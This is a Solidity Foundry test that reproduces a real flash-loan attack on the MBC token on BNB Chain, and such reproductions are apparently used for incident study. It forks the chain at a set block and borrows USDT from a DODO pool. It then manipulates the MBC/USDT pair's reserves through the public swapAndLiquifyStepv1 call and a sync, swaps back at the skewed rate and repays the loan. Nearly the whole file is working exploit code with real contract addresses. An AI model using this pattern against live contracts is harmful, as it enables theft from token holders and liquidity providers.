// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./interface.sol";

// @Analysis
// https://twitter.com/AnciliaInc/status/1597742575623888896
// @TX
// https://phalcon.blocksec.com/tx/bsc/0xdc53a6b5bf8e2962cf0e0eada6451f10956f4c0845a3ce134ddb050365f15c86


interface IMBC is IERC20 {
   function swapAndLiquifyStepv1() external;
}

contract ContractTest is DSTest {
    IERC20 USDT = IERC20(0x55d398326f99059fF775485246999027B3197955);
    IERC20 ETH = IERC20(0x2170Ed0880ac9A755fd29B2688956BD959F933F8);
    IMBC MBC = IMBC(0x4E87880A72f6896E7e0a635A5838fFc89b13bd17);
    address dodo = 0x9ad32e3054268B849b84a8dBcC7c8f7c52E4e69A;

    Uni_Router_V2 Router = Uni_Router_V2(0x10ED43C718714eb63d5aA57B78B54704E256024E);
    Uni_Pair_V2 Pair = Uni_Pair_V2(0x5b1Bf836fba1836Ca7ffCE26f155c75dBFa4aDF1);

    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

    uint dodoFlahloanAmount;

    function setUp() public {
        cheats.createSelectFork("bsc", 23474460);
    }

    function testExploit() public {
        USDT.approve(address(Router), type(uint256).max);
        MBC.approve(address(Router), type(uint256).max);
        dodoFlahloanAmount = USDT.balanceOf(dodo);
        DVM(dodo).flashLoan(
            0,
            dodoFlahloanAmount,
            address(this),
            new bytes(1)
        );

        emit log_named_decimal_uint(
            "[End] Attacker USDT balance after exploit",
            USDT.balanceOf(address(this)),
            18
        );
    }

    function DPPFlashLoanCall(
        address sender,
        uint256 baseAmount,
        uint256 quoteAmount,
        bytes calldata data
    ) external {

        // Intial rate MBC/USDT -> 1.1365032200116891/1
        // Pair getReserves -> 12475110456913920021663 / 10976748888389080860664
        address[] memory path = new address[](2);
        path[0] = address(MBC);
        path[1] = address(USDT);

        uint[] memory values = Router.getAmountsOut(150_000 * 10**18, path);

        USDT.transfer(address(Pair), 150_000 * 10**18);

        Pair.swap(
            11622067859410934780273,
            0,
            address(this),
            ""
        );

        MBC.swapAndLiquifyStepv1();

        Pair.sync();

        // Altered rate MBC/USDT -> 0.0052991665156216445/1
        // Pair getReserves -> 900258815097978209431 / 169886870405763976494888

        USDT.transfer(address(Pair), 1001);
        MBC.transfer(address(Pair), 10692302430658059997784);

        Pair.swap(
            0,
            155602136642505248762174,
            address(this),
            ""
        );

        USDT.transfer(dodo, dodoFlahloanAmount);
    }

}
